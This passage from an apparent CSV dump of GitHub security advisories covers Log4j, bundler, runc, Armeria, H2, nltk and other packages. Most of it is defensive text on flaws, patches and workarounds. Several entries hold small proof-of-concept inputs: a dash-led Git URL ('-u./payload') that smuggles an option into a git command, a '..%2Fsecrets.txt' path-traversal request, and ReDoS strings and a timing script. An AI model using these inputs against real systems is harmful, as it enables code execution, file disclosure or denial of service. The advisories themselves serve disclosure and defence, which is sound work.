### Workarounds
A workaround is to not accept the value of the `altField` option from untrusted sources.

### For more information
If you have any questions or comments about this advisory, search for a relevant issue in [the jQuery UI repo](https://github.com/jquery/jquery-ui/issues). If you don't find an answer, open a new issue.",npm
1864,20131,dask,GHSA-j8fq-86c5-5v2r,CVE-2021-42343,https://github.com/advisories/GHSA-j8fq-86c5-5v2r,critical,2021-10-27 18:53:48 UTC,Remote code execution in dask,An issue was discovered in Dask (aka python-dask) through 2021.09.1. Single machine Dask clusters started with dask.distributed.LocalCluster or dask.distributed.Client (which defaults to using LocalCluster) would mistakenly configure their respective Dask workers to listen on external interfaces (typically with a randomly selected high port) rather than only on localhost. A Dask cluster created using this method (when running on a machine that has an applicable port exposed) could be used by a sophisticated attacker to achieve remote code execution.,pip
1865,14631,Piranha,GHSA-jvjp-vh27-r9h5,CVE-2021-25977,https://github.com/advisories/GHSA-jvjp-vh27-r9h5,moderate,2021-10-27 18:53:03 UTC,Cross-site Scripting in PiranhaCMS,"In PiranhaCMS, versions 7.0.0 to 9.1.1 are vulnerable to stored XSS due to the page title improperly sanitized. By creating a page with a specially crafted page title, a low privileged user can trigger arbitrary JavaScript execution. ",nuget
1866,33923,org.apache.logging.log4j:log4j-api,GHSA-jfh8-c2jp-5v3q,CVE-2021-44228,https://github.com/advisories/GHSA-jfh8-c2jp-5v3q,critical,2021-12-10 00:40:56 UTC,Remote code injection in Log4j,"# Summary

Log4j versions prior to 2.16.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.
As per [Apache's Log4j security guide](https://logging.apache.org/log4j/2.x/security.html): Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.16.0, this behavior has been disabled by default.

Log4j version 2.15.0 contained an earlier fix for the vulnerability, but that patch did not disable attacker-controlled JNDI lookups in all situations. For more information, see the `Updated advice for version 2.16.0` section of this advisory.

# Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input. 

# Affected versions

Any Log4J version prior to v2.15.0 is affected to this specific issue.

The v1 branch of Log4J which is considered End Of Life (EOL) is vulnerable to other RCE vectors so the recommendation is to still update to 2.16.0 where possible.

## Affected packages
Only the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` package is included on this advisory to prevent version desync which may occur as a result of dependabot actions.

# Remediation Advice

## Updated advice for version 2.16.0

The Apache Logging Services team provided updated mitigation advice upon the release of version 2.16.0, which [disables JNDI by default and completely removes support for message lookups](https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0).
Even in version 2.15.0, lookups used in layouts to provide specific pieces of context information will still recursively resolve, possibly triggering JNDI lookups. This problem is being tracked as [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). More information is available on the [GitHub Security Advisory for CVE-2021-45046](https://github.com/advisories/GHSA-7rjr-3q55-vv33).

Users who want to avoid attacker-controlled JNDI lookups but cannot upgrade to 2.16.0 must [ensure that no such lookups resolve to attacker-provided data and ensure that the the JndiLookup class is not loaded](https://issues.apache.org/jira/browse/LOG4J2-3221).

Please note that Log4J v1 is End Of Life (EOL) and will not receive patches for this issue. Log4J v1 is also vulnerable to other RCE vectors and we recommend you migrate to Log4J 2.16.0 where possible.",maven
1867,33909,org.apache.logging.log4j:log4j-core,GHSA-jfh8-c2jp-5v3q,CVE-2021-44228,https://github.com/advisories/GHSA-jfh8-c2jp-5v3q,critical,2021-12-10 00:40:56 UTC,Remote code injection in Log4j,"# Summary

Log4j versions prior to 2.16.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.
As per [Apache's Log4j security guide](https://logging.apache.org/log4j/2.x/security.html): Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.16.0, this behavior has been disabled by default.

Log4j version 2.15.0 contained an earlier fix for the vulnerability, but that patch did not disable attacker-controlled JNDI lookups in all situations. For more information, see the `Updated advice for version 2.16.0` section of this advisory.

# Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input. 

# Affected versions

Any Log4J version prior to v2.15.0 is affected to this specific issue.

The v1 branch of Log4J which is considered End Of Life (EOL) is vulnerable to other RCE vectors so the recommendation is to still update to 2.16.0 where possible.

## Security releases
Additional backports of this fix have been made available in versions 2.3.1, 2.12.2, and 2.12.3

## Affected packages
Only the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.

# Remediation Advice

## Updated advice for version 2.16.0

The Apache Logging Services team provided updated mitigation advice upon the release of version 2.16.0, which [disables JNDI by default and completely removes support for message lookups](https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0).
Even in version 2.15.0, lookups used in layouts to provide specific pieces of context information will still recursively resolve, possibly triggering JNDI lookups. This problem is being tracked as [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). More information is available on the [GitHub Security Advisory for CVE-2021-45046](https://github.com/advisories/GHSA-7rjr-3q55-vv33).

Users who want to avoid attacker-controlled JNDI lookups but cannot upgrade to 2.16.0 must [ensure that no such lookups resolve to attacker-provided data and ensure that the the JndiLookup class is not loaded](https://issues.apache.org/jira/browse/LOG4J2-3221).

Please note that Log4J v1 is End Of Life (EOL) and will not receive patches for this issue. Log4J v1 is also vulnerable to other RCE vectors and we recommend you migrate to Log4J 2.16.0 where possible.

",maven
1868,33923,org.apache.logging.log4j:log4j-api,GHSA-7rjr-3q55-vv33,CVE-2021-45046,https://github.com/advisories/GHSA-7rjr-3q55-vv33,critical,2021-12-14 18:01:28 UTC,Incomplete fix for Apache Log4j vulnerability,"# Impact

The fix to address [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allow attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a remote code execution (RCE) attack. 

# Mitigation

Log4j 2.16.0 fixes this issue by removing support for message lookup patterns and disabling JNDI functionality by default. This issue can be mitigated in prior releases (< 2.16.0) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).

Log4j 2.15.0 restricts JNDI LDAP lookups to localhost by default. Note that previous mitigations involving configuration such as to set the system property `log4j2.formatMsgNoLookups` to `true` do NOT mitigate this specific vulnerability.",maven
1869,33909,org.apache.logging.log4j:log4j-core,GHSA-7rjr-3q55-vv33,CVE-2021-45046,https://github.com/advisories/GHSA-7rjr-3q55-vv33,critical,2021-12-14 18:01:28 UTC,Incomplete fix for Apache Log4j vulnerability,"# Impact

The fix to address [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allow attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a remote code execution (RCE) attack. 

## Affected packages
Only the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.

# Mitigation

Log4j 2.16.0 fixes this issue by removing support for message lookup patterns and disabling JNDI functionality by default. This issue can be mitigated in prior releases (< 2.16.0) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).

Log4j 2.15.0 restricts JNDI LDAP lookups to localhost by default. Note that previous mitigations involving configuration such as to set the system property `log4j2.formatMsgNoLookups` to `true` do NOT mitigate this specific vulnerability.",maven
1870,19835,lxml,GHSA-55x5-fj6c-h6m8,CVE-2021-43818,https://github.com/advisories/GHSA-55x5-fj6c-h6m8,high,2021-12-13 18:14:36 UTC,lxml's HTML Cleaner allows crafted and SVG embedded scripts to pass through,"### Impact
The HTML Cleaner in lxml.html lets certain crafted script content pass through, as well as script content in SVG files embedded using data URIs.

Users that employ the HTML cleaner in a security relevant context should upgrade to lxml 4.6.5.

### Patches
The issue has been resolved in lxml 4.6.5.

### Workarounds
None.

### References
The issues are tracked under the report IDs GHSL-2021-1037 and GHSL-2021-1038.
",pip
1871,37718,org.apache.jackrabbit:oak-core,GHSA-3h68-wvv6-8r5h,CVE-2020-1940,https://github.com/advisories/GHSA-3h68-wvv6-8r5h,high,2021-12-10 17:20:11 UTC,Improper Removal of Sensitive Information Before Storage or Transfer in Apache Jackrabbit Oak,"The optional initial password change and password expiration features present in Apache Jackrabbit Oak 1.2.0 to 1.22.0 are prone to a sensitive information disclosure vulnerability. The code mandates the changed password to be passed as an additional attribute to the credentials object but does not remove it upon processing during the first phase of the authentication. In combination with additional, independent authentication mechanisms, this may lead to the new password being disclosed.",maven
1872,34365,io.netty:netty-codec-http,GHSA-wx5j-54mm-rqqq,CVE-2021-43797,https://github.com/advisories/GHSA-wx5j-54mm-rqqq,moderate,2021-12-09 19:09:17 UTC,HTTP request smuggling in io.netty:netty-codec-http,"### Impact

Netty currently just skips control chars when these are present at the beginning / end of the header name. We should better fail fast as these are not allowed by the spec and could lead to HTTP request smuggling.

Failing to do the validation might cause netty to ""sanitize"" header names before it forward these to another remote system when used as proxy. This remote system can't see the invalid usage anymore and so not do the validation itself.

",maven
1873,28945,Flask-AppBuilder,GHSA-m3rf-7m4w-r66q,CVE-2021-41265,https://github.com/advisories/GHSA-m3rf-7m4w-r66q,high,2021-12-09 19:09:07 UTC,Improper Authentication in Flask-AppBuilder,"### Impact
Improper authentication on the REST API. Allows for a malicious actor with a carefully crafted request to successfully authenticate and gain access to existing protected REST API endpoints. Only affects non database authentication types, and new REST API endpoints.

### Patches
Upgrade to Flask-AppBuilder 3.3.4

### For more information
If you have any questions or comments about this advisory:
* Open an issue in https://github.com/dpgaspar/Flask-AppBuilder
",pip
1874,19832,Django,GHSA-v6rh-hp5x-86rv,CVE-2021-44420,https://github.com/advisories/GHSA-v6rh-hp5x-86rv,high,2021-12-09 19:09:37 UTC,Potential bypass of an upstream access control based on URL paths in Django,"In Django 2.2 before 2.2.25, 3.1 before 3.1.14, and 3.2 before 3.2.10, HTTP requests for URLs with trailing newlines could bypass upstream access control based on URL paths. This issue has low severity, according to the Django security policy.",pip
1875,34335,org.apereo.cas:cas-server-core-web,GHSA-gfhx-jjwq-63gv,CVE-2021-42567,https://github.com/advisories/GHSA-gfhx-jjwq-63gv,moderate,2021-12-10 20:24:11 UTC,Cross-site Scripting in Apereo CAS,Apereo CAS through 6.4.1 allows XSS via POST requests sent to the REST API endpoints.,maven
1876,18813,bundler,GHSA-fj7f-vq84-fh43,CVE-2021-43809,https://github.com/advisories/GHSA-fj7f-vq84-fh43,moderate,2021-12-08 19:51:36 UTC,Local Code Execution through Argument Injection via dash leading git url parameter in Gemfile.,"In `bundler` versions before 2.2.33, when working with untrusted and apparently harmless `Gemfile`'s, it is not expected that they lead to execution of external code, unless that's explicit in the ruby code inside the `Gemfile` itself. However, if the `Gemfile` includes `gem` entries that use the `git` option with invalid, but seemingly harmless, values with a leading dash, this can be false.

To handle dependencies that come from a Git repository instead of a registry, Bundler uses various commands, such as `git clone`. These commands are being constructed using user input (e.g. the repository URL). When building the
commands, Bundler versions before 2.2.33 correctly avoid Command Injection vulnerabilities by passing an array of arguments instead of a command string. However, there is the possibility that a user input starts with a dash (`-`) and is therefore treated as an optional argument instead of a positional one. This can lead to Code Execution because some of the commands have options that can be leveraged to run arbitrary executables.

Since this value comes from the `Gemfile` file, it can contain any character, including a leading dash.

### Exploitation

To exploit this vulnerability, an attacker has to craft a directory containing a `Gemfile` file that declares a dependency that is located in a Git repository. This dependency has to have a Git URL in the form of `-u./payload`. This URL
will be used to construct a Git clone command but will be interpreted as the [upload-pack](https://git-scm.com/docs/git-clone#Documentation/git-clone.txt--ultupload-packgt) argument. Then this directory needs to be shared with the victim, who then needs to run a command that evaluates the Gemfile, such as `bundle lock`, inside.

### Impact

This vulnerability can lead to Arbitrary Code Execution, which could potentially lead to the takeover of the system. However, as explained above, the exploitability is very low, because it requires a lot of user interaction. It still could put developers at risk when dealing with untrusted files in a way they think is safe, because the exploit still works when the victim tries to make sure nothing can happen, e.g. by manually reviewing the `Gemfile` (although they would need the weird URL with a leading dash to not raise any flags).

This kind of attack vector [has been used in the past](https://www.cnbc.com/2021/01/26/north-korean-hackers-targeting-security-researchers-on-twitter.html) to target security researchers by sending them projects to collaborate on.

### Patches

Bundler 2.2.33 has patched this problem by inserting `--` as an argument before any positional arguments to those Git commands that were affected by this issue.

### Workarounds

Regardless of whether users can upgrade or not, they should review any untrustred `Gemfile`'s before running any `bundler` commands that may read them, since they can contain arbitrary ruby code.

### References

https://cwe.mitre.org/data/definitions/88.html",rubygems
1877,19430,solidus_core,GHSA-qxmr-qxh6-2cc9,CVE-2021-43805,https://github.com/advisories/GHSA-qxmr-qxh6-2cc9,high,2021-12-07 22:01:47 UTC,ReDos vulnerability on guest checkout email validation,"### Impact
Denial of service vulnerability that could be exploited during a guest checkout. The regular expression used to validate a guest order's email was subject to exponential backtracking through a fragment like `a.a.`.

Before the patch, it can be reproduced in the console like this:

```ruby
irb(main)> Spree::EmailValidator::EMAIL_REGEXP.match ""a@a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.@""
processing time: 54.293660s
=> nil
```

To reproduce in the browser, fill in the ""Customer Email"" field with that fake email address during a guest checkout. Before that, you should open the browser dev tools and change the `type` attribute for that field from `email` to `text`. After entering a fake address and pressing the ""Save & Continue"" button, the browser will take a long term to perform the request before showing an error message for the invalid address. Eventually, making the email string even longer could lead to the exhaustion of server resources.


### Patches
Versions 3.1.4, 3.0.4, and 2.11.13 have been patched to use a different regular expression.

There's an improbable chance that some orders in your system end up having associated an email address that is no longer valid. We've added a task to check precisely that:

```bash
bin/rails solidus:check_orders_with_invalid_email
```

The above will print information for every affected order if any.

### Workarounds

If a prompt upgrade is not an option, please, add the following to `config/application.rb`:

```ruby
config.after_initialize do
  Spree::EmailValidator.send(:remove_const, :EMAIL_REGEXP)
  Spree::EmailValidator::EMAIL_REGEXP = URI::MailTo::EMAIL_REGEXP
end
```

### References

- https://en.wikipedia.org/wiki/ReDoS
- https://snyk.io/blog/redos-and-catastrophic-backtracking/

### For more information
If you have any questions or comments about this advisory:
* Open an [issue](https://github.com/solidusio/solidus/issues) or a [discussion](https://github.com/solidusio/solidus/discussions) in Solidus.
* Email us at [security@solidus.io](mailto:security@soliidus.io)
* Contact the core team on [Slack](http://slack.solidus.io/)
",rubygems
1878,24191,nomad,GHSA-2jhh-5xm2-j4gf,CVE-2021-43415,https://github.com/advisories/GHSA-2jhh-5xm2-j4gf,high,2021-12-10 20:17:55 UTC,Improper Authentication in HashiCorp Nomad,"HashiCorp Nomad and Nomad Enterprise up to 1.0.13, 1.1.7, and 1.2.0, with the QEMU task driver enabled, allowed authenticated users with job submission capabilities to bypass the configured allowed image paths. Fixed in 1.0.14, 1.1.8, and 1.2.1.",go
1879,22385,runc,GHSA-v95c-p5hm-xq8f,CVE-2021-43784,https://github.com/advisories/GHSA-v95c-p5hm-xq8f,moderate,2021-12-07 21:22:39 UTC,Overflow in netlink bytemsg length field allows attacker to override netlink-based container configuration,"### Impact

In runc, [netlink](https://www.man7.org/linux/man-pages/man7/netlink.7.html) is used internally as a serialization system for specifying the relevant container configuration to the C portion of our code (responsible for the based namespace setup of containers). In all versions of runc prior to 1.0.3, the encoder did not handle the possibility of an integer overflow in the 16-bit length field for the byte array attribute type, meaning that a large enough malicious byte array attribute could result in the length overflowing and the attribute contents being parsed as netlink messages for container configuration.

This vulnerability requires the attacker to have some control over the configuration of the container and would allow the attacker to bypass the namespace restrictions of the container by simply adding their own netlink payload which disables all namespaces.

Prior to 9c444070ec7bb83995dbc0185da68284da71c554, in practice it was fairly difficult to specify an arbitrary-length netlink message with most container runtimes. The only user-controlled byte array was the namespace paths attributes which can be specified in runc's `config.json`, but as far as we can tell no container runtime gives raw access to that configuration setting -- and having raw access to that setting **would allow the attacker to disable namespace protections entirely anyway** (setting them to `/proc/1/ns/...` for instance). In addition, each namespace path is limited to 4096 bytes (with only 7 namespaces supported by runc at the moment) meaning that even with custom namespace paths it appears an attacker still cannot shove enough bytes into the netlink bytemsg in order to overflow the uint16 counter.

However, out of an abundance of caution (given how old this bug is) we decided to treat it as a potentially exploitable vulnerability with a low severity. After 9c444070ec7bb83995dbc0185da68284da71c554 (which was not present in any release of runc prior to the discovery of this bug), all mount paths are included as a giant netlink message which means that this bug becomes significantly more exploitable in more reasonable threat scenarios.

The main users impacted are those who allow untrusted images with untrusted configurations to run on their machines (such as with shared cloud infrastructure), though as mentioned above it appears this bug was not practically exploitable on any released version of runc to date.

### Patches
The patch for this is d72d057ba794164c3cce9451a00b72a78b25e1ae and runc 1.0.3 was released with this bug fixed.

### Workarounds
To the extent this is exploitable, disallowing untrusted namespace paths in container configuration should eliminate all practical ways of exploiting this bug. It should be noted that untrusted namespace paths would allow the attacker to disable namespace protections entirely even in the absence of this bug.

### References
* commit d72d057ba794 (""runc init: avoid netlink message length overflows"")
* https://bugs.chromium.org/p/project-zero/issues/detail?id=2241

### Credits
Thanks to Felix Wilhelm from Google Project Zero for discovering and reporting this vulnerability. In particular, the fact they found this vulnerability so quickly, before we made a 1.1 release of runc (which would've been vulnerable) was quite impressive.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [our repo](https://github.com/opencontainers/runc)
",go
1880,16863,next,GHSA-25mp-g6fv-mqxx,CVE-2021-43803,https://github.com/advisories/GHSA-25mp-g6fv-mqxx,high,2021-12-07 21:12:09 UTC,Unexpected server crash in Next.js.,"Next.js is a React framework. In versions of Next.js prior to 12.0.5 or 11.1.3, invalid or malformed URLs could lead to a server crash. In order to be affected by this issue, the deployment must use Next.js versions above 11.1.0 and below 12.0.5, Node.js above 15.0.0, and next start or a custom server. Deployments on Vercel are not affected, along with similar environments where invalid requests are filtered before reaching Next.js. Versions 12.0.5 and 11.1.3 contain patches for this issue. Note that prior version 0.9.9 package `next` hosted a different utility (0.4.1 being the latest version of that codebase), and this advisory does not apply to those versions.",npm
1881,38043,com.linecorp.armeria:armeria,GHSA-8fp4-rp6c-5gcv,CVE-2021-43795,https://github.com/advisories/GHSA-8fp4-rp6c-5gcv,high,2021-12-02 22:25:54 UTC,Path Traversal in com.linecorp.armeria:armeria,"### Impact

An attacker can access an Armeria server's local file system beyond its restricted directory by sending an HTTP request whose path contains `%2F` (encoded `/`), such as `/files/..%2Fsecrets.txt`, bypassing Armeria's path validation logic.

### Patches

Armeria 1.13.4 or above contains the hardened path validation logic that handles `%2F` properly. 

### Workarounds

This vulnerability can be worked around by inserting a decorator that performs an additional validation on the request path, e.g.

```java
Server
  .builder()
  .serviceUnder(
    ""/files"",
    FileService
      .of(...)
      .decorate((delegate, ctx, req) -> {
        String path = req.headers().path();
        if (path.contains(""%2f"") || path.contains(""%2F"")) {
          return HttpResponse.of(HttpStatus.BAD_REQUEST);
        }
        return delegate.serve(ctx, req);
      })
  )
  .build()
```

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [line/armeria](https://github.com/line/armeria)
* Chat with us at [Slack](https://armeria.dev/s/slack)

### Credits

This vulnerability was originally reported by Abdallah Zaher ([elcayser-0x0a](https://hackerone.com/elcayser-0x0a?type=user)).",maven
1882,18865,actionpack,GHSA-qphc-hf5q-v8fc,CVE-2021-44528,https://github.com/advisories/GHSA-qphc-hf5q-v8fc,moderate,2021-12-14 21:19:08 UTC,Open Redirect in actionpack,"Specially crafted ""X-Forwarded-Host"" headers in combination with certain
""allowed host"" formats can cause the Host Authorization middleware in Action
Pack to redirect users to a malicious website.

Impacted applications will have allowed hosts with a leading dot. For example,
configuration files that look like this:

```
config.hosts <<  '.EXAMPLE.com'
```

When an allowed host contains a leading dot, a specially crafted Host header
can be used to redirect to a malicious website.

This vulnerability is similar to CVE-2021-22881 and CVE-2021-22942.

Releases
--------
The fixed releases are available at the normal locations.

Patches
-------
To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* 6-0-host-authorzation-open-redirect.patch - Patch for 6.0 series
* 6-1-host-authorzation-open-redirect.patch - Patch for 6.1 series
* 7-0-host-authorzation-open-redirect.patch - Patch for 7.0 series

Please note that only the 6.1.Z, 6.0.Z, and 5.2.Z series are supported at
present. Users of earlier unsupported releases are advised to upgrade as soon
as possible as we cannot guarantee the continued availability of security
fixes for unsupported releases.",rubygems
1883,33876,log4j:log4j,GHSA-fp5r-v3w9-4333,CVE-2021-4104,https://github.com/advisories/GHSA-fp5r-v3w9-4333,high,2021-12-14 19:49:31 UTC,JMSAppender in Log4j 1.2 is vulnerable to deserialization of untrusted data,"JMSAppender in Log4j 1.2 is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration. The attacker can provide TopicBindingName and TopicConnectionFactoryBindingName configurations causing JMSAppender to perform JNDI requests that result in remote code execution in a similar fashion to CVE-2021-44228. Note this issue only affects Log4j 1.2 when specifically configured to use JMSAppender, which is not the default. Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.",maven
1884,33908,com.h2database:h2,GHSA-7rpj-hg47-cx62,CVE-2021-23463,https://github.com/advisories/GHSA-7rpj-hg47-cx62,high,2021-12-16 14:29:57 UTC,Improper Restriction of XML External Entity Reference in com.h2database:h2.,"H2 is an embeddable RDBMS written in Java. The package com.h2database:h2 from 0 and before 2.0.202 are vulnerable to XML External Entity (XXE) Injection via the org.h2.jdbc.JdbcSQLXML class object, when it receives parsed string data from org.h2.jdbc.JdbcResultSet.getSQLXML() method. If it executes the getSource() method when the parameter is DOMSource.class it will trigger the vulnerability.",maven
1885,33929,ch.qos.logback:logback-core,GHSA-668q-qrv7-99fm,CVE-2021-42550,https://github.com/advisories/GHSA-668q-qrv7-99fm,moderate,2021-12-17 20:00:50 UTC,Deserialization of Untrusted Data in logback,"In logback version 1.2.7 and prior versions, an attacker with the required privileges to edit configurations files could craft a malicious configuration allowing to execute arbitrary code loaded from LDAP servers.",maven
1886,33909,org.apache.logging.log4j:log4j-core,GHSA-p6xc-xr62-6r2g,CVE-2021-45105,https://github.com/advisories/GHSA-p6xc-xr62-6r2g,high,2021-12-18 18:00:07 UTC,Apache Log4j2 vulnerable to Improper Input Validation and Uncontrolled Recursion,"Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3) did not protect from uncontrolled recursion from self-referential lookups. This allows an attacker with control over Thread Context Map data to cause a denial of service when a crafted string is interpreted. This issue was fixed in Log4j 2.17.0 and 2.12.3.


# Affected packages
Only the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.",maven
1887,33923,org.apache.logging.log4j:log4j-api,GHSA-p6xc-xr62-6r2g,CVE-2021-45105,https://github.com/advisories/GHSA-p6xc-xr62-6r2g,high,2021-12-18 18:00:07 UTC,Improper Input Validation and Uncontrolled Recursion in Apache Log4j2,Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3) did not protect from uncontrolled recursion from self-referential lookups. This allows an attacker with control over Thread Context Map data to cause a denial of service when a crafted string is interpreted. This issue was fixed in Log4j 2.17.0 and 2.12.3.,maven
1888,33923,org.apache.logging.log4j:log4j-api,GHSA-8489-44mv-ggj8,CVE-2021-44832,https://github.com/advisories/GHSA-8489-44mv-ggj8,moderate,2022-01-04 16:14:20 UTC,Improper Input Validation and Injection in Apache Log4j2,"Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to an attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.

This issue does not impact default configurations of Log4j2 and requires an attacker to have control over the Log4j2 configuration, which reduces the likelihood of being exploited.",maven
1889,33909,org.apache.logging.log4j:log4j-core,GHSA-8489-44mv-ggj8,CVE-2021-44832,https://github.com/advisories/GHSA-8489-44mv-ggj8,moderate,2022-01-04 16:14:20 UTC,Improper Input Validation and Injection in Apache Log4j2,"Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to an attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.


# Affected packages
Only the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.

This issue does not impact default configurations of Log4j2 and requires an attacker to have control over the Log4j2 configuration, which reduces the likelihood of being exploited.",maven
1890,20158,django-filter,GHSA-x7gm-rfgv-w973,CVE-2020-15225,https://github.com/advisories/GHSA-x7gm-rfgv-w973,high,2020-09-28 19:05:29 UTC,Potential DoS with NumberFilter conversion to integer values.,"### Impact

Automatically generated `NumberFilter` instances, whose value was later converted to an integer, were subject to potential DoS from maliciously input using exponential format with sufficiently large exponents. 

### Patches

Version 2.4.0+ applies a `MaxValueValidator` with a a default `limit_value` of 1e50 to the form field used by `NumberFilter` instances. 

In addition, `NumberFilter` implements the new `get_max_validator()` which should return a configured validator instance to customise the limit, or else `None` to disable the additional validation. 

### Workarounds

Users may manually apply an equivalent validator if they are not able to upgrade.  

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [the django-filter repo](https://github.com/carltongibson/django-filter)

Thanks to Marcin Waraksa for the report. 
",pip
1891,33908,com.h2database:h2,GHSA-h376-j262-vhq6,CVE-2021-42392,https://github.com/advisories/GHSA-h376-j262-vhq6,critical,2022-01-06 23:55:09 UTC,RCE in H2 Console,"### Impact
H2 Console in versions since 1.1.100 (2008-10-14) to 2.0.204 (2021-12-21) inclusive allows loading of custom classes from remote servers through JNDI.

H2 Console doesn't accept remote connections by default. If remote access was enabled explicitly and some protection method (such as security constraint) wasn't set, an intruder can load own custom class and execute its code in a process with H2 Console (H2 Server process or a web server with H2 Console servlet).

It is also possible to load them by creation a linked table in these versions, but it requires `ADMIN` privileges and user with `ADMIN` privileges has full access to the Java process by design. These privileges should never be granted to untrusted users.

### Patches
Since version 2.0.206 H2 Console and linked tables explicitly forbid attempts to specify LDAP URLs for JNDI. Only local data sources can be used.

### Workarounds
H2 Console should never be available to untrusted users.

`-webAllowOthers` is a dangerous setting that should be avoided.

H2 Console Servlet deployed on a web server can be protected with a security constraint:
https://h2database.com/html/tutorial.html#usingH2ConsoleServlet
If `webAllowOthers` is specified, you need to uncomment and edit `<security-role>` and `<security-constraint>` as necessary. See documentation of your web server for more details.

### References
This issue was found and privately reported to H2 team by [JFrog Security](https://www.jfrog.com/)'s vulnerability research team with detailed information.
",maven
1892,20023,nltk,GHSA-rqjh-jp2r-59cj,CVE-2021-3842,https://github.com/advisories/GHSA-rqjh-jp2r-59cj,high,2022-01-06 22:24:14 UTC,nltk is vulnerable to Inefficient Regular Expression Complexity,nltk is vulnerable to Inefficient Regular Expression Complexity,pip
1893,19901,celery,GHSA-q4xr-rc97-m4xx,CVE-2021-23727,https://github.com/advisories/GHSA-q4xr-rc97-m4xx,high,2022-01-06 22:22:02 UTC,OS Command Injection in celery,"This affects the package celery before 5.2.2. It by default trusts the messages and metadata stored in backends (result stores). When reading task metadata from the backend, the data is deserialized. Given that an attacker can gain access to, or somehow manipulate the metadata within a celery backend, they could trigger a stored command injection vulnerability and potentially gain further access to the system.",pip
1894,20023,nltk,GHSA-f8m6-h2c7-8h9x,CVE-2021-43854,https://github.com/advisories/GHSA-f8m6-h2c7-8h9x,high,2022-01-06 17:38:45 UTC,"Inefficient Regular Expression Complexity in nltk (word_tokenize, sent_tokenize)","### Impact
The vulnerability is present in [`PunktSentenceTokenizer`](https://www.nltk.org/api/nltk.tokenize.punkt.html#nltk.tokenize.punkt.PunktSentenceTokenizer), [`sent_tokenize`](https://www.nltk.org/api/nltk.tokenize.html#nltk.tokenize.sent_tokenize)  and [`word_tokenize`](https://www.nltk.org/api/nltk.tokenize.html#nltk.tokenize.word_tokenize). Any users of this class, or these two functions, are vulnerable to a Regular Expression Denial of Service (ReDoS) attack. 
In short, a specifically crafted long input to any of these vulnerable functions will cause them to take a significant amount of execution time. The effect of this vulnerability is noticeable with the following example:
```python
from nltk.tokenize import word_tokenize

n = 8
for length in [10**i for i in range(2, n)]:
    # Prepare a malicious input
    text = ""a"" * length
    start_t = time.time()
    # Call `word_tokenize` and naively measure the execution time
    word_tokenize(text)
    print(f""A length of {length:<{n}} takes {time.time() - start_t:.4f}s"")
```
